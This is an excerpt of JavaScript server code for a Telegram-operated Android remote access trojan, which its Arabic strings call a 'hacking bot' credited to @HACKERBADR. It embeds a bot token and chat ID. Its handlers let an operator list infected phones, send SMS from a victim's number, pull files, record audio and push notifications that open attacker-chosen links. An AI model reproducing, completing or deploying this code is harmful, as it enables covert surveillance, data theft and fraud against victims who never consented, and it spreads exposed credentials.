...
const token = '7676030040:AAFTH-MS5ih1L9ZMQ1Kpy4yfOWgLmfFXKVU'
const id = '8575231636'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت :  عبدالسلام الباروت  الضامئ قناة المطور @HACKERBADR</h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الهاشمي')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الهاشمي الئ الرقم الذي كتبتة قبل قليل....\n\n' +
                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الهاشمي الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور عبدالسلام الباروت  الضامئ قناة المطور @HACKERBADR ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
        ...
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الهاشمي')) {
        ...
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الهاشمي')) {
        ...
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الهاشمي')) {
        ...
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
            ...
            appBot.sendMessage(id,
                ...
                '• عندما ينقر الهاشمي على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
                {reply_markup: {force_reply: true}}
            )
        }
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت عبدالسلام الباروت  الضامئ قناة المطور @HACKERBADR\n\n' +
                '• إذا كان  مثبتًا على الجهاز المستهدف ، فانتظر الاتصال\n\n' +
        ...
        if (message.text == 'الاجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• ارسل رقم الهاتف اجهزة متصلة ومتوفرة\n\n' +
                    '• تأكد من ارسل رقم الهاتف   على الجهاز المستهدف'
                )
            } else {
...
appBot.on("callback_query", (callbackQuery) => {
    ...
    if (commend == 'device') {
        appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📱ات', callback_data: `apps:${uuid}`},
    ...
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الهاشمي\n\n' +
    ...
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الهاشمي\n\n' +
    ...
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الهاشمي\n\n' +
